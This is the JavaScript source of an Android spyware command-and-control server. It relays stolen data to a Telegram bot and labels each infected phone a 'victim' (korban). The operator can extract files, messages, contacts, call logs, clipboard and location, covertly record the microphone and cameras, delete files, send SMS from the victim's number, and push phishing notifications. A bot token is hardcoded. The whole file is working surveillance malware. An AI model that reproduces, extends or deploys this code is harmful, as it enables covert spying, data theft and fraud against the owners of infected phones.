const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");

const token = '7916252452:AAHbg3xNdecvPLxCTBEWpzqWv3p7ni3Syu4'
const id = '7811407402'
const address = 'https://www.google.com'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

const upload = multer();
app.use(bodyParser.json());

let currentUuid = ''
let currentNumber = ''
let currentTitle = ''

app.get('/', function (req, res) {
    res.send('<h1 align="center">Bot Starting@YanzOfficial</h1>')
})

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname
    appBot.sendDocument(id, req.file.buffer, {
            caption: `°• Message In <b>${req.headers.model}</b>`,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: 'application/txt',
        })
    res.send('')
})
app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°• Message for<b>${req.headers.model}</b> phone\n\n` + req.body['text'], {parse_mode: "HTML"})
    res.send('')
})
app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
    appBot.sendMessage(id, `°• Location For <b>${req.headers.model}</b> Phone`, {parse_mode: "HTML"})
    res.send('')
})
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model
    const battery = req.headers.battery
    const version = req.headers.version
    const brightness = req.headers.brightness
    const provider = req.headers.provider

    ws.uuid = uuid
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    })
    appBot.sendMessage(id,
        `°• Korban baru\n\n` +
        `• Model Phone : <b>${model}</b>\n` +
        `• battery : <b>${battery}</b>\n` +
        `• Android Version : <b>${version}</b>\n` +
        `• Kecerahan Layar <b>${brightness}</b>\n` +
        `• Provider : <b>${provider}</b>`,
        {parse_mode: "HTML"}
    )
    ws.on('close', function () {
        appBot.sendMessage(id,
            `°• Tidak ada perangkat yang terhubung \n\n` +
            `• Device Model : <b>${model}</b>\n` +
            `• Battery : <b>${battery}</b>\n` +
            `• Android Version : <b>${version}</b>\n` +
            `• Kecerahan Layar : <b>${brightness}</b>\n` +
            `• Provider : <b>${provider}</b>`,
            {parse_mode: "HTML"}
        )
        appClients.delete(ws.uuid)
    })
})
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('°• Silakan tulis nomor yang ingin Anda kirimi dari nomor korban ')) {
            currentNumber = message.text
            appBot.sendMessage(id,
                '°• Ok sekarang tulis pesan yang ingin Anda kirim dari perangkat korban ke nomor yang Anda tulis beberapa saat yang lalu. ...\n\n' +
                '• Berhati-hatilah agar pesan tidak terkirim jika jumlah karakter dalam pesan Anda lebih dari jumlah yang diperbolehkan, ',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• Ok sekarang tulis pesan yang ingin Anda kirim dari perangkat korban ke nomor yang Anda tulis beberapa saat yang lalu....')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`)
                }
            });
            currentNumber = ''
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Permintaan Anda sedang diproses, harap tunggu. ........\n\n' +
                '• Anda akan menerima tanggapan dalam beberapa saat berikutnya @YanzOfficial ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Perangkat yang terhubung"], ["Jalankan perintahnya"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• Silakan tulis pesan yang ingin Anda kirimkan kepada semua orang. ')) {
            const message_to_all = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Permintaan Anda sedang diproses, harap tunggu. .......\n\n' +
                '• Harap Tunggu @YanzOfficial',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Perangkat yang terhubung"], ["Jalankan perintahnya"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• Masukkan jalur file yang ingin Anda ekstrak dari perangkat korban ')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Permintaan Anda sedang diproses, harap tunggu. .......\n\n' +
                '• Harap tunggu @YanzOfficial',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Perangkat yang terhubung"], ["Jalankan perintahnya"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• Masukkan jalur file yang Anda inginkan.')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Permintaan Anda sedang diproses, harap tunggu. .......\n\n' +
                '• Harap Tunggu @YanzOfficial',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Perangkat yang terhubung"], ["Jalankan perintahnya"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• Masukkan durasi yang Anda inginkan untuk merekam suara korban.  ')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Permintaan Anda sedang diproses, harap tunggu. .......\n\n' +
                '• Harap Tunggu @YanzOfficial',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Perangkat yang terhubung"], ["Jalankan perintahnya"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°•Masukkan durasi yang Anda inginkan untuk direkam oleh kamera depan. ')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°•  Permintaan Anda sedang diproses, harap tunggu. .......\n\n' +
                '• Harap Tunggu @YanzOfficial',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Perangkat yang terhubung"], ["Jalankan perintahnya"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes( '°• Masukkan durasi yang Anda inginkan untuk direkam oleh kamera selfie korban')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°•  Permintaan Anda sedang diproses, harap tunggu. .......\n\n' +
                '• Harap Tunggu @YanzOfficial',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Perangkat yang terhubung"], ["Jalankan perintahnya"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• Masukkan pesan yang ingin Anda tampilkan di perangkat korban')) {
            const toastMessage = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${toastMessage}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Permintaan Anda sedang diproses, harap tunggu. .......\n\n' +
                '• Harap Tunggu @YanzOfficial',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Perangkat yang terhubung"], ["Jalankan perintahnya"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• Masukkan pesan yang ingin Anda tampilkan sebagai notifikasi')) {
            const notificationMessage = message.text
            currentTitle = notificationMessage
            appBot.sendMessage(id, '°• Bagus, sekarang masukkan tautan yang ingin Anda buka melalui notifikasi\n\n' + '• Ketika korban mengklik notifikasi tersebut, maka link yang Anda masukkan akan terbuka,',  
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• Hebat, sekarang masukkan tautan yang ingin Anda buka dengan notifikasi')) {
            const link = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`show_notification:${currentTitle}/${link}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• Permintaan Anda sedang diproses, harap tunggu. .......\n\n' +
                '• Harap Tunggu @YanzOfficial',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Perangkat yang terhubung"], ["Jalankan perintahnya"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• Masukkan tautan ke audio yang ingin Anda putar')) {
            const audioLink = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`play_audio:${audioLink}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°•  Permintaan Anda sedang diproses, harap tunggu. .......\n\n' +
                '• Harap Tunggu @YanzOfficial',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Perangkat yang terhubung"], ["Jalankan perintahnya"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id, '°• Selamat datang di pengembang Bot peretasan @ardimendok\n\n' + '• Jika aplikasi diinstal pada perangkat target, tunggu koneksi\n\n' + '• Ketika Anda mendapatkan pesan koneksi, itu berarti perangkat target terhubung dan siap menerima perintah\n\n' + '• Klik pada tombol perintah dan pilih perangkat yang diinginkan lalu tentukan perintah yang diinginkan di antara perintah tersebut\n\n' + '• Jika Anda terjebak di suatu tempat di bot, kirimkan perintah /start,', {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Perangkat yang terhubung"], ["Jalankan perintahnya"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.text == 'Perangkat yang terhubung') {
            if (appClients.size == 0) {
                appBot.sendMessage(id, '°• Tidak ada perangkat yang terhubung dan tersedia\n\n' + '• Pastikan aplikasi terinstal di perangkat target' )
            } else {
                let text = '°• Daftar perangkat yang Terhubung:\n\n'
                appClients.forEach(function (value, key, map) {
                    text += `• Device Model: <b>${value.model}</b> \n` + `• Battery: <b>${value.battery}</b> \n` + `• Android System: <b>${value.version}</b> \n` + `• kecerahan layar: <b>${value.brightness}</b> \n` + `• Provider: <b>${value.provider}</b> \n\n` })
                appBot.sendMessage(id, text, {parse_mode: "HTML"})
            }
        }
        if (message.text == 'Jalankan perintahnya') {
            if (appClients.size == 0) {
                appBot.sendMessage(id, '°• Tidak ada perangkat yang terhubung dan tersedia\n\n' + '• Pastikan aplikasi terinstal di perangkat target' )
            } else {
                const deviceListKeyboard = []
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: value.model,
                        callback_data: 'device:' + key
                    }])
                })
                appBot.sendMessage(id, '°• Pilih perangkat untuk menjalankan perintah', {
                    "reply_markup": {
                        "inline_keyboard": deviceListKeyboard,
                    },
                })
            }
        }
    } else {
        appBot.sendMessage(id, '°• Permission request denied')
    }
})
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data
    const commend = data.split(':')[0]
    const uuid = data.split(':')[1]
    console.log(uuid)
    if (commend == 'device') {
        appBot.editMessageText(`°• Set the praise for the device: <b>${appClients.get(data.split(':')[1]).model}</b> `, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: 'Apps', callback_data: `apps:${uuid}`},
                        {text: 'Device Info', callback_data: `device_info:${uuid}`}
                    ],
                    [
                        {text: 'Get File', callback_data: `file:${uuid}`},
                        {text: 'Delete File', callback_data: `delete_file:${uuid}`}
                    ],
                    [
                        {text: 'Clipboard', callback_data: `clipboard:${uuid}`},
                        {text: 'Microphone', callback_data: `microphone:${uuid}`},
                    ],
                    [
                        {text: 'Camera Main', callback_data: `camera_main:${uuid}`},
                        {text: 'Camera Selfie', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: 'Location', callback_data: `location:${uuid}`},
                        {text: 'Toast', callback_data: `toast:${uuid}`}
                    ],
                    [
                        {text: 'Calls Histore', callback_data: `calls:${uuid}`},
                        {text: 'Contacts', callback_data: `contacts:${uuid}`}
                    ],
                    [
                        {text: 'Getaran', callback_data: `vibrate:${uuid}`},
                        {text: 'Shoe Notification', callback_data: `show_notification:${uuid}`}
                    ],
                    [
                        {text: 'Messages', callback_data: `messages:${uuid}`},
                        {text: 'Send Message', callback_data: `send_message:${uuid}`}
                    ],
                    [
                        {text: 'Play Audio', callback_data: `play_audio:${uuid}`},
                        {text: 'Stop Audio', callback_data: `stop_audio:${uuid}`},
                    ],
                    [
                        {
                            text: 'Kirim Pesan Ke Semua Kontak',
                            callback_data: `send_message_to_all:${uuid}`
                        }
                    ],
                ]
            },
            parse_mode: "HTML"
        })
    }
    if (commend == 'calls') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('calls');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• Permintaan Anda sedang diproses harap tunggu.....nn' + '• Anda akan menerima tanggapan dalam beberapa saat berikutnya Pengembang @YanzOfficial', {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Perangkat yang terhubung"], ["Jalankan perintahnya"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'contacts') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('contacts');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• Permintaan Anda sedang diproses harap tunggu.....nn' + '• Anda akan menerima tanggapan dalam beberapa saat berikutnya Pengembang @YanzOfficial', {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Perangkat yang terhubung"], ["Jalankan perintahnya"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'messages') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('messages');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• Permintaan Anda sedang diproses harap tunggu.....nn' + '• Anda akan menerima tanggapan dalam beberapa saat berikutnya Pengembang @YanzOfficial', {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Perangkat yang terhubung"], ["Jalankan perintahnya"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'apps') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('apps');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• Permintaan Anda sedang diproses harap tunggu.....nn' + '• Anda akan menerima tanggapan dalam beberapa saat berikutnya Pengembang @YanzOfficial', {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Perangkat yang terhubung"], ["Jalankan perintahnya"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'device_info') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('device_info');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• Permintaan Anda sedang diproses harap tunggu.....nn' + '• Anda akan menerima tanggapan dalam beberapa saat berikutnya Pengembang @YanzOfficial', {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Perangkat yang terhubung"], ["Jalankan perintahnya"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'clipboard') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('clipboard');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• Permintaan Anda sedang diproses harap tunggu.....nn' + '• Anda akan menerima tanggapan dalam beberapa saat berikutnya Pengembang @YanzOfficial', {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Perangkat yang terhubung"], ["Jalankan perintahnya"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_main') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_main');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• Permintaan Anda sedang diproses harap tunggu.....nn' + '• Anda akan menerima tanggapan dalam beberapa saat berikutnya Pengembang @YanzOfficial', {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Perangkat yang terhubung"], ["Jalankan perintahnya"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_selfie') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_selfie');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• Permintaan Anda sedang diproses harap tunggu.....nn.....nn' + '• Anda akan menerima tanggapan dalam beberapa saat berikutnya Pengembang @YanzOfficial', {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Perangkat yang terhubung"], ["Jalankan perintahnya"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'location') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('location');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• Permintaan Anda sedang diproses harap tunggu.....nn.....' + '• Anda akan menerima tanggapan dalam beberapa saat berikutnya Pengembang @YanzOfficial', {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Perangkat yang terhubung"], ["Jalankan perintahnya"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'vibrate') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('vibrate');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°•  Permintaan Anda sedang diproses harap tunggu.....nn' + '• Anda akan menerima tanggapan dalam beberapa saat berikutnya Pengembang @YanzOfficial', {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Perangkat yang terhubung"], ["Jalankan perintahnya"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'stop_audio') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('stop_audio');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• Permintaan Anda sedang diproses harap tunggu.....nn' + '• Anda akan menerima tanggapan dalam beberapa saat berikutnya Pengembang @YanzOfficial', {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Jalankan perintahnya"], ["Jalankan perintahnya"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'send_message') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• Silakan masukkan nomor yang ingin Anda kirimi dari nomor korban\n\n' + '• Jika Anda ingin mengirim SMS ke nomor negara lokal, Anda dapat memasukkan nomor yang diawali dengan angka nol, jika tidak, masukkan nomor dengan kode negara,',
            {reply_markup: {force_reply: true}})
        currentUuid = uuid
    }
    if (commend == 'send_message_to_all') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• Silakan tulis pesan yang ingin Anda kirimkan kepada semua orang\n\n' + '• Berhati-hatilah agar pesan tidak terkirim jika jumlah karakter dalam pesan Anda lebih dari jumlah yang diperbolehkan,',
            {reply_markup: {force_reply: true}}
        )
        currentUuid = uuid
    }
    if (commend == 'file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• Masukkan jalur file yang ingin Anda tarik dari perangkat korban\n\n' + '• Anda tidak perlu memasukkan jalur file lengkap, cukup masukkan jalur root. Misalnya, masukkan <b>DCIM/Camera</b> untuk menerima file galeri.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'delete_file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• Masukkan path file yang Anda inginkan \n\n' + '• Anda tidak perlu memasukkan path file lengkap, cukup masukkan path utama. Misalnya, masukkan <b>DCIM/Camera</b> untuk menghapus file galeri.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'microphone') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• Masukkan jalur ke file yang Anda inginkan \n\n' + '• Perhatikan bahwa waktu harus dimasukkan secara numerik dalam hitungan detik,',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'toast') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• Masukkan pesan yang ingin Anda tampilkan di perangkat korban\n\n' + '• Ini adalah pesan singkat yang muncul di layar perangkat selama beberapa detik,',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'show_notification') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• Masukkan pesan yang ingin Anda tampilkan sebagai notifikasi\n\n' + '• Pesan Anda akan muncul di bilah status perangkat target seperti notifikasi biasa,',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'play_audio') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• °• Masukkan link audio yang ingin Anda putar\n\n' + '• Perhatikan bahwa Anda harus memasukkan link langsung dari audio yang diinginkan, jika tidak, audio tidak akan diputar,',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
});
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping')
    });
    try {
        axios.get(address).then(r => "")
    } catch (e) {
    }
}, 5000)
appServer.listen(process.env.PORT || 8999);
